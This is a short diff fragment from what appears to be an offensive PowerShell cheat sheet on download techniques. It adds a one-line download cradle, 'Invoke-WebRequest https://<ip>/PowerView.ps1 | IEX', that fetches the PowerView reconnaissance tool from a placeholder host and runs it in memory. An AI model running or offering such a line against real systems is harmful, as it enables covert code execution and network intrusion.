@@ -93,5 +93,5 @@ Invoke-WebRequest https://example.com/script.ps1 -OutFile script.ps1
 
 #### Can be bypassed using `-UseBasicParsing`
 ```powershell
-
+Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
 ```
